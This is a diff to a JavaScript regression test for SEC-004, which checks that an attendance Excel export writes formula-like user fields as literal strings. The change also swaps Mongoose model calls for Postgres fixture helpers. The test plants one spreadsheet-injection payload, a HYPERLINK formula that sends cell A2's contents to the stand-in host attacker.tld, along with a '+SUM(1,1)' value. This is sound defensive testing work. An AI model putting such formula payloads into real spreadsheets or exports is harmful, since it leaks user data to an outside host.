@@ -89,16 +89,15 @@ describe('safeCell() (SEC-004 helper)', () => {
 
 describe('exportAttendance (SEC-004 generateExcel)', () => {
   test('user.name = "=1+1" is written as literal string in workbook', async () => {
-    const User = require('../../models/User');
-    const Schedule = require('../../models/Schedule');
-    const Attendance = require('../../models/Attendance');
+    const fx = require('../fixtures/pg-fixtures');
+    const { updateActiveRow } = require('../pg-test-utils');
     const { exportAttendance } = require('../../services/exportService');
 
     // Plant an attacker-controlled name on a fresh user. We override the
     // existing seed user rather than create one to keep the test isolated
     // from FK/Index constraints elsewhere.
     const evilName = '=HYPERLINK("http://attacker.tld/?u="&A2,"Click")';
-    await User.findByIdAndUpdate(seed.member2._id, {
+    await updateActiveRow('User', seed.member2._id, {
       name: evilName,
       department: '+SUM(1,1)',
     });
@@ -106,14 +105,14 @@ describe('exportAttendance (SEC-004 generateExcel)', () => {
     // Seed a past schedule + attendance row so the export pipeline has
     // something to emit.
     const past = new Date(Date.now() - 24 * 3600_000);
-    const sch = await Schedule.create({
+    const sch = await fx.createSchedule({
       classId: seed.class1._id,
       bookedTeamId: seed.team._id,
       startTime: past,
       endTime: new Date(past.getTime() + 90 * 60_000),
       enrolledUsers: [seed.member2._id],
     });
-    await Attendance.create({
+    await fx.createAttendance({
       scheduleId: sch._id,
       userId: seed.member2._id,
       status: 'P',
